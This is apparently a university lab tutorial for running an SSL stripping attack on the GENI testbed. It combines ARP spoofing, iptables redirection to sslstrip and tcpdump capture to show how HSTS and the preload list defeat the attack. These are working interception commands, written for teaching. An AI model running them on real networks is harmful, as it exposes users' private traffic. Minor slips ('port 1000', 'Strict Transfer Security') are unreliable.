In this experiment, we will set up an SSL stripping attack on GENI and will demonstrate what the attack does to the encrypted communication between a client and a site. We will examine what information an “attacker” can see by using the attack and under what conditions the attack works.

It should take about thirty minutes to run this experiment.

This experiment involves running a potentially disruptive application over a private network within your slice on GENI. Take special care not to use this application in ways that may adversely affect other infrastructure outside of your slice! Users of GENI are responsible for ensuring compliance with the [GENI Resource Recommended User Policy](http://groups.geni.net/geni/raw-attachment/wiki/RUP/RUP.pdf).

To reproduce this experiment on GENI, you will need an account on the [GENI Portal](http://groups.geni.net/geni/wiki/SignMeUp), and you will need to have [joined a project](http://groups.geni.net/geni/wiki/JoinAProject). You should have already [uploaded your SSH keys to the portal and know how to log in to a node with those keys](http://groups.geni.net/geni/wiki/HowTo/LoginToNodes). If you're not sure if you have those skills, you may want to try [Lab Zero](http://tinyurl.com/geni-labzero) first.

* Skip to [Results](#results)
* Skip to [Run my experiment](#run-my-experiment)

## Background

SSLstrip is a protocol-downgrade attack that allows an attacker to intercept the contents of an exchange that would normally be confidential. It can occur when an exchange that is supposed to result in a secure (encrypted) connection is initiated insecurely (non-encrypted). E.g. connecting to a site over HTTP that redirects to HTTPS or clicking on a link (to a secure site) from an insecure site.

The attack involves two steps:

1. The attacker mounts an MITM (man-in-the-middle) attack so that traffic from the target’s device will be sent through the attacker.
2. When the target visits a website, the attacker acts as a proxy, serving an HTTP (non-encrypted) version of the site to the target. Meanwhile, the attacker relays all of the target's actions on the site to the real destination over HTTPS.

The target can see that the connection is insecure, but does not know whether the connection should be secure. The website that the target visits cannot see the attack and believes the connection to be secure (since it sees an HTTPS connection to the proxy operated by the attacker).

[HSTS](https://https.cio.gov/hsts/) (HTTP Strict Transfer Security) is a protocol that helps mitigate SSLstrip attacks. Each time a user establishes an HTTPS connection to a site, the site sends back a header message that says "From now on [usually for two years], only connect to this site over HTTPS". That information is saved by the user's browser, and if in the future the browser sees that there is a request over HTTP, it will attempt to switch to HTTPS/or it won't connect. It is important to note that not all websites that support HTTPS include HSTS response headers. 

Connections to websites that support HSTS are still susceptible to SSLstrip when a connection is made for the first time or if a secure connection has not previously been made (since the browser has not yet received an HSTS header). However, there is an HSTS Preload list that comes with the browser. The browser will not accept an HTTP request from any website on the preload list even if you are visiting the site for the first time. A site on the preload list must support HTTPS throughout its site and provide properly-configured HSTS response headers.

## Results

In this experiment, an "attacker" is able to use SSLstrip to switch normally encrypted-HTTPS traffic to unencrypted-HTTP traffic allowing the attacker to see all the contents of the communications between a client and the sites it accesses. 

The following is an example of what normally happens when we visit http://ny.gov. We see that we are redirected to an HTTPS version of the site (https://www.ny.gov). If you look at the upper-left corner of the video, you will see a green-padlock icon in the address bar and the URL will include https:// which indicate that the connection is encrypted. On the right, the terminal displays insecure content that the someone (other than us or the site) could normally see. (Someone could know we are accessing ny.gov, but not know what we are doing on the site since the content is encrypted.)

**I have a recording**

When an attacker executes an SSLstrip attack and we visit http://ny.gov, we see that we are served an HTTP version of the site (www.nyu.edu). In the address bar there is no green-padlock icon and there is no https:// since the connection is insecure (Firefox, by default, will trim the URL and not display http://). On the right, the terminal displays the insecure content that the attacker can see which includes all the content that would normally be private.

**I have a recording**

Normally, when we visit http://acl.gov, we will be directed to the HTTPS version of the site.

![](https://raw.githubusercontent.com/esilver0/CATT/SSLv3/acl_HTTPS_top.png)


In the following example, we connect to http://acl.gov which supports HSTS. There is an SSLstrip attack and this is the first connection. We can see that the connection is insecure.

![](https://raw.githubusercontent.com/esilver0/CATT/SSLv3/acl_HTTP_top.png)


In the following example, we connect to http://acl.gov after having already established a secure connection with the site. There is an SSLstrip attack. We can see that the connection is secure.

![](https://raw.githubusercontent.com/esilver0/CATT/SSLv3/acl_HTTPS_top.png)


In the following example, we connect to http://youtube.com during an SSLstrip attack. youtube.com is on the HSTS preload list and we connect for the first time. We can see that the connection is secure.

![](https://raw.githubusercontent.com/esilver0/CATT/SSLv3/youtube_HTTPS_top.png)


## Run my experiment

First, reserve your resources. You will need one publicly routable IP&mdash;if you are having trouble getting resources, you may use [this monitoring page](https://genimon.uky.edu/status) to find sites with publicly routable IPs available.

In the GENI Portal, create a new slice, then click "Add Resources". Load the RSpec from the URL: https://raw.githubusercontent.com/esilver0/CATT/master/sslstrip_request_rspec.xml

![](https://raw.githubusercontent.com/esilver0/CATT/SSLv3/sslstrip_topology.png)

This should load a topology onto your canvas, with a client, a router, and an attacker. The RSpec also includes commands to install necessary software on the nodes. Click on "Site 1" and choose an InstaGENI site to bind to, then reserve your resources.

Wait for your nodes to boot up (they will turn green on the canvas display on your slice page in the GENI portal when they are ready). Then, wait another couple of minutes for the software installation to finish. Finally, use SSH to log in to each node in your topology (using the login details given in the GENI Portal).

### Open a browser on the client

To see what our "client" node sees when it browses the Internet, we'll need to be able to open a web browser on our client node. We will set up a VNC connection so that we can run graphical applications on the client.

On the client node, run

```
vncserver :0  
```

and enter a password (twice) when prompted. (Nothing will appear as you type the password.) **Choose "n"** when asked to enter a view-only password. After a few seconds and a few lines of output, you should be returned to your terminal prompt:

```
ffund01@client:~$ vncserver :0

You will require a password to access your desktops.

Password:  
Verify:  
Would you like to enter a view-only password (y/n)? n  
xauth:  file /users/ffund01/.Xauthority does not exist

New 'X' desktop is client.sslstrip.ch-geni-net.instageni.maxgigapop.net:0

Creating default startup script /users/ffund01/.vnc/xstartup  
Starting applications specified in /users/ffund01/.vnc/xstartup  
Log file is /users/ffund01/.vnc/client.sslstrip.ch-geni-net.instageni.maxgigapop.net:0.log  
```

Next, we will install a ["connector"](http://novnc.com/info.html) that will let us access this graphical interface from a web browser. On the client node, run

```
git clone git://github.com/kanaka/noVNC  
```

and then

<pre>
cd noVNC/
screen ./utils/launch.sh --vnc <b>client.sslstrip.ch-geni-net.instageni.maxgigapop.net</b>:5900
</pre>

where in place of the bold part above, you use the hostname shown for the client node in the GENI Portal. (Leave the command running. If the SSH connection is lost, you can reattach to the screen. See [Notes](#notes).)

After some more lines of output, you should see a URL, e.g.:

```
Navigate to this URL:

    http://client.sslstrip.ch-geni-net.instageni.maxgigapop.net:6080/vnc.html?host=client.sslstrip.ch-geni-net.instageni.maxgigapop.net&port=6080
``` 

Open this URL in a browser. (A recent version of Google Chrome is recommended.) Enter a password when prompted. Then, at the terminal, run

```
firefox  
```

and a browser window should come up.

This browser is running on the "client" node, _not_ on your own laptop. Leave this open&mdash;we will use it throughout our experiment.

> _**Note**: Some InstaGENI racks have a firewall in place that will block incoming traffic on the noVNC port. If everything looks normal in the terminal output but you haven't been able to open the URL in a browser, you might want to try using a different InstaGENI rack._



### Redirect traffic for remote site through router

In this experiment, we will attack an exchange between this client and several websites.

By default, if you visit https://witestlab.poly.edu in the Firefox browser that's running in NoVNC, traffic between the client and the website will go through the control interface on the client (that is used to log in to the client over SSH), not through the experiment interface. To demonstrate the SSL stripping attack, we'll want this traffic to go over the experiment network. Before we redirect the traffic, we need to set up a seperate route for the SSH connection (and VNC connection) to continue to go through the control interface so we can still connect to the client. 

Open another SSH session to the client, and in it, run

```
netstat -n | awk '/:22 / || /:6080 / {print $5}' | cut -d: -f1 | sort -u
```

to find out the IP address that you are connecting from (as visible to the host that you are logged in to). (The command outputs the IP addresses connected to ports 22 and 6080 on the client&mdash;the SSH connection is on port 22 and the VNC connection is on port 6080.)

Add the routing rule

<pre>
sudo route add -net <b>216.165.95.0/24</b> gw $(netstat -r | awk '/default/ { print $2 }')
</pre>

to set up the route for your IP address. If you are connecting from 216.165.95.174, you would replace the bold part with "216.165.95.0/24" (the whole network range, not the IP only, because if the network you are on uses NAT pooling then you might break your SSH connection). (When you run this command, the `$(netstat -r | awk '/default/ { print $2 }')` variable will be filled in automatically with the IP address of the default gateway&mdash;the `netstat -r` command retrieves the Kernel IP routing table and `awk '/default/ { print $2 }'` selects the desired IP address from the table.)

Now that you have done that, you can delete the current default gateway rule

```
sudo route del default
```

and add one for the router

```
sudo route add default gw 192.168.0.1
```

then all traffic from the client EXCEPT traffic to/from your own network, will be forwarded to the router.

Then run

```
route -n
```

and verify that these host-specific entries appear in the routing table. For example:

<pre>
ers595@client:~/noVNC$ route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.0.1     0.0.0.0         UG    0      0        0 eth1
128.104.159.0   0.0.0.0         255.255.255.0   U     0      0        0 eth0
192.168.0.0     0.0.0.0         255.255.255.0   U     0      0        0 eth1
<b>216.165.95.0</b>    <b>128.104.159.1</b>   255.255.255.0   UG    0      0        0 eth0
</pre>

**216.165.95.0** is your network number and **128.104.159.1** is the IP address of the default gateway.

For return traffic to the client from the websites to reach the router, we'll also need to set up NAT on the router. Open an SSH session to the router node, and run

<pre>
sudo iptables -A FORWARD -o eth0 -i eth1 -s 192.168.0.0/24 -m conntrack --ctstate NEW -j ACCEPT  
sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT  
sudo iptables -t nat -F POSTROUTING  
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
</pre>

Here,

* The first rule tracks connections involving the 192.168.0.0/24 network, and makes sure that packets initiating a new connection are forwarded from the LAN to the WAN.
* The second rule allows forwarding of packets that are part of an established connection.
* The third and fourth rules actually do the network address translation. They will rewrite the source IP address in the Layer 3 header of packets forwarded out on the WAN interface. Also, when packets are received from the WAN, it identifies the connection that they belong to, rewrites the destination IP address in the Layer 3 headers, and forwards them on the LAN.


(For more details on how NAT works, see [this experiment](https://witestlab.poly.edu/blog/basic-home-gateway-services-dhcp-dns-nat/#nat).)

Also make sure that the router is forwarding traffic, by running

```
sudo sysctl -w net.ipv4.ip_forward=1
```

on the router node.

To make sure this all works as expected, on the router node run

```
sudo tcpdump -i eth1
```

and in the Firefox instance running in NoVNC, visit

http://witestlab.poly.edu

Make sure that the page loads, and make sure you can see exchange in your `tcpdump` window&mdash;this is how you know that traffic for this host is going through the router via the experiment network, and not through the control interface on the client. Once you have verified this, you can stop the `tcpdump` on the router.

### Execute the man-in-the-middle attack

We're now ready to carry out the attack. Open an SSH session to the attacker node.

Set up the attacker to forward traffic:

```
sudo sysctl -w net.ipv4.ip_forward=1
```

and to perform NAT:

```
sudo iptables -A FORWARD -o eth0 -i eth1 -s 192.168.0.0/24 -m conntrack --ctstate NEW -j ACCEPT  
sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT  
sudo iptables -t nat -F POSTROUTING  
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
```

Now, we're going to use ARP spoofing to get the client to send traffic through the attacker, instead of directly to the router. On the client node, check the client's ARP table with

```
arp -n -a -i eth1
```

You should see that the client has an entry for the router's IP address (192.168.0.1), with the router's MAC address. (Use `ifconfig eth1` on the router to verify its MAC address.) For example:

```
? (192.168.0.1) at 02:fb:83:fe:12:7e [ether] on eth1
```

Next, on the attacker, run

```
screen sudo arpspoof -i eth1 -t 192.168.0.2 192.168.0.1
```

to start the ARP spoofing. Re-run

```
arp -n -a -i eth1
```

on the client, and you should now see an entry for the router's IP address (192.168.0.1) but with the attacker's MAC address. For example:

```
? (192.168.0.99) at 02:ec:23:e9:fe:46 [ether] on eth1
? (192.168.0.1) at 02:ec:23:e9:fe:46 [ether] on eth1
```

Verify that the man-in-the-middle attack works. On the attacker node, run

```
sudo tcpdump -i eth1 tcp
```

and on the router node, also run

```
sudo tcpdump -i eth1 tcp
```

Finally, in the Firefox running in NoVNC, reload the web page at 

http://witestlab.poly.edu

Verify that the page loads (it should still be over HTTPS). You should see traffic in the `tcpdump` that runs on the attacker, but not on the `tcpdump` that runs on the router. Once you've verified this, you can stop both `tcpdump` instances.

### Execute the HTTPS stripping attack

Finally, we're ready to execute the HTTPS stripping part of the attack.

On the attacker node, run the following command:

```
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```

This will redirect traffic from port 80 (the default web port for HTTP traffic) to port 1000, which is where the proxy will listen.

Then, on the attacker, run

```
screen sslstrip -l 10000
```

to start the SSL stripping proxy.

#### Visit a site for the first time

On the attacker node, run
```
sudo tcpdump -s 1514 -i eth1 'port 80' -U -w - | tee unencrypted.pcap | tcpdump -nnxxXSs 1514 -r -
```
to display the traffic on port 80. This is unencrypted communication between the client and the site that the attacker can see. The output is saved to unencrypted.pcap.

In the Firefox window where NoVNC is running, visit

http://acl.gov

for the first time. You should verify that the page loads over HTTP. 

The web server at acl.gov is configured to redirect to HTTPS for HTTP connections. Therefore, if we stop SSlstrip before we visit the site again, the page should load over HTTPS.

On an SSH session on the attacker, run

```
killall sslstrip
sudo iptables -t nat -D PREROUTING 1
```

to stop the SSL stripping proxy and stop redirecting traffic from port 80. (You may need to wait a minute for the change to take effect.)

In the Firefox window where NoVNC is running, visit

http://acl.gov.

Verify that this time the connection is over HTTPS.

When SSLstrip was turned off we received an HTTPS version of the site, but when it was turned on we received an HTTP version of the site, demonstrating that SSLstrip works.

#### Visit a site that you have already established a secure connection with

The web server at acl.gov is configured to send out HSTS headers. Now that acl.gov has been connected to securely, reconnect to the site with SSLstrip enabled.

On the attacker node, run

```
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
screen sslstrip -l 10000
```

to redirect traffic from port 80 to port 1000 and restart the SSL stripping proxy. 

In the Firefox window where NoVNC is running, visit

http://acl.gov

once more.

Verify that this time there is an HTTPS connection even though SSLstrip is enabled.

To see the HSTS header, in the Firefox window where NoVNC is running press Ctrl&#8209;Shift&#8209;k to open the console. Click on network, then refresh the page. Scroll to the top and click on the top file. In the headers section, look for "Strict-Transfer-Security". 

![](https://raw.githubusercontent.com/esilver0/CATT/SSLv3/Strict-Transport-Security-Header_small.png)

#### Visit a site that does not support HSTS

On an SSH session on the attacker, run

```
killall sslstrip
sudo iptables -t nat -D PREROUTING 1
```

to disable the SSL stripping attack.

In the Firefox window where NoVNC is running, visit

http://nj.gov

for the first time. Verify the website supports HTTPS.

Then, on the attacker node run

```
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
screen sslstrip -l 10000
```
to enable the SSL stripping attack.

In the Firefox window where NoVNC is running, visit

http://nj.gov

for the second time.

Verify that the connection is via HTTP even though a connection via HTTPS was already established. Using the same steps as before, check on the console to see if you can find an HSTS header (You should not). After you look, you can close the console.

> _**Note**: At the time of writing, the website did not support HSTS. If you see an HSTS header, see [Notes](#notes) for alternative websites._

#### Visit a site on the HSTS preload list

In the Firefox window where NoVNC is running, visit

http://youtube.com

for the first time. 

Verify that there is an HTTPS connection and that youtube.com is on the [list](https://hg.mozilla.org/releases/mozilla-release/raw-file/tip/security/manager/ssl/nsSTSPreloadList.inc).

## Notes

### Useful Websites

A list of United States Federal government websites with indication as to whether or not they support HTTPS, HSTS, etc. can be found at https://pulse.cio.gov/https/domains/.

More information about HSTS response headers can be found at https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security.



### Detaching from and attaching to a screen

Press Ctrl&#8209;A then Ctrl&#8209;D to detach from a screen without terminating the process.
To reattach to a screen after detaching, run.
```
screen -r
```

To reattach to a screen after an SSH connection is lost, run

```
screen -Dr
```

### Exercise
